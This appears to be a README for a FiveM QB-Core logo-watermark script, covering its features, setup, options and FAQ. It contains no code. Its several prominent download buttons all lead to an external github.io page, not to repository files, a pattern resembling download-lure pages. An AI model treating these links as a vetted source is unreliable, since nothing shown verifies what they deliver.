# qp-watermark - FiveM Logo Overlay Script 2026

> **A compact watermark overlay made for QB-Core servers.** It puts a server logo or brand mark on screen with a neon-inspired animation, and it shifts to the upper-right corner when the player gets into a vehicle so it stays visible without blocking the action.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/colefelixfnq2190/fivem-watermark-script?style=flat-square)](https://github.com/colefelixfnq2190/fivem-watermark-script)

---

<p align="center">
  <a href="https://colefelixfnq2190.github.io/fivem-watermark-script/">
    <img src="https://img.shields.io/badge/Download-qp-watermark%20Script-brightgreen?style=for-the-badge" alt="Download qp-watermark Script">
  </a>
</p>

> **[Direct Download - qp-watermark](https://colefelixfnq2190.github.io/fivem-watermark-script/)**

---

[Download Latest Build](https://colefelixfnq2190.github.io/fivem-watermark-script/)

---

## What It Does

`qp-watermark` is a straightforward way to keep a custom logo or watermark present on a player's screen while they are connected to a FiveM server using QB-Core. It is meant to support server branding without getting in the way of normal play. When the player enters a vehicle, the overlay transitions to the top right, keeping the branding readable and out of the center of the screen.

The current release emphasizes stable placement and a restrained neon animation. Because the script uses HTML and Lua, you can easily adjust the logo image, animation timing, and screen offsets. It is built to stay lightweight and fit cleanly into most QB-Core-based servers.

## Features

- **Custom Logo Overlay** - Displays a server-specific image or logo on the player's screen.
- **Neon-Style Motion** - Uses a soft glow animation to give the watermark a modern look.
- **Vehicle-Aware Positioning** - Relocates the overlay to the top right when a player enters a vehicle.
- **QB-Core Support** - Designed for FiveM servers running the QB-Core framework.
- **HTML and Lua Layout** - Simple structure for editing assets, animation values, and placement logic.
- **Low Resource Impact** - Intended to stay light on client performance and frame rate.
- **Always Visible** - The watermark remains on screen, including during menus or cutscenes.
- **Quick Setup** - Place the folder in your resources directory and start the resource.

## Setup

1. Download the latest build from the link above.
2. Extract the `qp-watermark` folder into your FiveM server's `resources` directory.
3. Add `ensure qp-watermark` to your server configuration file (e.g., `server.cfg`).
4. Restart your server or start the resource manually.

No additional dependencies are required beyond a standard QB-Core setup.

## Options

Configuration is handled through the script's main HTML or Lua file. Below is an example of adjustable settings:

| Option | Description | Default |
|--------|-------------|---------|
| `logoImage` | Path to the logo image file | `./logo.png` |
| `animationSpeed` | Speed of the neon glow animation (ms) | `1500` |
| `vehicleOffsetX` | Horizontal offset when in vehicle (px) | `20` |
| `vehicleOffsetY` | Vertical offset when in vehicle (px) | `20` |

To customize, edit the relevant variables in the script files. For example, in the HTML file, change `logoImage` to point to your own logo asset.

## Compatibility

- **Platform:** FiveM
- **Framework:** QB-Core (tested with latest versions)
- **Game Versions:** All FiveM builds that support QB-Core resources
- **Known Limitations:** The script may not function correctly on non-QB-Core servers. The neon animation effect may vary depending on client-side graphics settings.

## FAQ

**Q: How do I change the logo image?**  
A: Replace the logo file in the script folder with your own image, then update the `logoImage` path in the HTML file.

**Q: Does this script work on ESX or other frameworks?**  
A: It is built specifically for QB-Core. Adapting it to other frameworks would require modifying the integration code.

**Q: Can I adjust the animation speed?**  
A: Yes. Locate the `animationSpeed` variable in the script and change the value to your preferred duration in milliseconds.

**Q: Will the watermark cause performance issues?**  
A: The script is designed to be lightweight. However, large or high-resolution logo images may increase resource usage.

**Q: How do I update the script?**  
A: Download the latest release and replace the existing `qp-watermark` folder with the new version. Ensure any custom logo files are backed up.

**Q: Is there a way to disable the watermark while in a vehicle?**  
A: The current version moves the watermark rather than hiding it. You can modify the script to hide the element when entering a vehicle if desired.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
